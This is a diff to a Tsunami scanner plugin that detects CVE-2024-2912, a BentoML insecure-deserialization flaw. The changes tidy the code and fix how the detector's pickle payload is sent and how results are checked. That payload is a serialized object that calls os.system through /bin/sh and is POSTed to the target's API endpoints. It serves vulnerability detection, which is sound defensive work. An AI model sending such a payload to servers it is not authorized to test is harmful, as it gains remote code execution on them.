@@ -32,12 +32,13 @@ _VULN_DESCRIPTION = (
     'The BentoML framework is vulnerable to an insecure deserialization issue that can'
     ' be exploited by sending a single POST request to any valid endpoint. '
     'The impact of this is remote code execution.'
+    'The affected versions are between 1.2.0 and 1.2.4.'
 )
 _SLEEP_TIME_SEC = 20
 
 
 class Cve20242912Detector(tsunami_plugin.VulnDetector):
-    """A TsunamiPlugin that detects RCE on the BentoMLtarget."""
+    """A TsunamiPlugin that detects RCE on the BentoML target."""
 
     def __init__(
             self, http_client: HttpClient, payload_generator: PayloadGenerator
@@ -71,11 +72,11 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
     Args:
       target: TargetInfo about BentoML Insecure Deserialization.
       matched_services: A list of network services whose vulnerabilities could
-        be detected by this plugin. "rtsp" for example would be on this list.
+        be detected by this plugin. "ppp" for example would be on this list.
 
     Returns:
       A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
-      scanning target.d
+      scanning target.
     """
         logging.info('Cve20242912Detector starts detecting.')
         vulnerable_services = [
@@ -98,7 +99,7 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
                 not network_service.service_name
                 or network_service_utils.is_web_service(network_service)
                 or network_service_utils.get_service_name(network_service) == 'unknown'
-                or network_service_utils.get_service_name(network_service) == 'rtsp'
+                or network_service_utils.get_service_name(network_service) == 'ppp'
         )
 
     def _IsServiceVulnerable(
@@ -117,10 +118,8 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
         try:
             response = self.http_client.send(request, network_service)
             for pathName in response.body_json()["paths"]:
-                print(pathName)
                 for httpMethod in response.body_json()["paths"][pathName]:
                     for tags in response.body_json()["paths"][pathName][httpMethod]["tags"]:
-                        print(tags)
                         if tags == "Service APIs":
                             paths_and_methods.append([pathName, httpMethod])
         except Exception:  # pylint: disable=broad-exception-caught
@@ -145,6 +144,7 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
                 return os.system, (f'/bin/sh -c "{payload.get_payload()}"',)
 
         rce_command = pickle.dumps(Payload())
+        responsesBody = []
         for path_and_method in paths_and_methods:
             url = self._BuildUrl(network_service, path_and_method[0])
             request = (
@@ -159,10 +159,13 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
             )
             try:
                 response = self.http_client.send(request, network_service)
-                time.sleep(_SLEEP_TIME_SEC)
-                return payload.check_if_executed(response.body)
+                responsesBody.append(response.body)
             except Exception:  # pylint: disable=broad-exception-caught
                 logging.exception('Unable to query %s', url)
+            time.sleep(_SLEEP_TIME_SEC)
+            for responseBody in responsesBody:
+                if payload.check_if_executed(responseBody):
+                    return True
         return False
 
     def _BuildUrl(self, network_service: tsunami_plugin.NetworkService, vulnerable_path) -> str:
@@ -175,9 +178,9 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
             url = 'http://{}/'.format(
                 network_endpoint_utils.to_uri_authority(
                     network_service.network_endpoint
-                )
+                ).strip("/")
             )
-        return url + vulnerable_path
+        return url + vulnerable_path.strip("/")
 
     def _BuildDetectionReport(
             self,
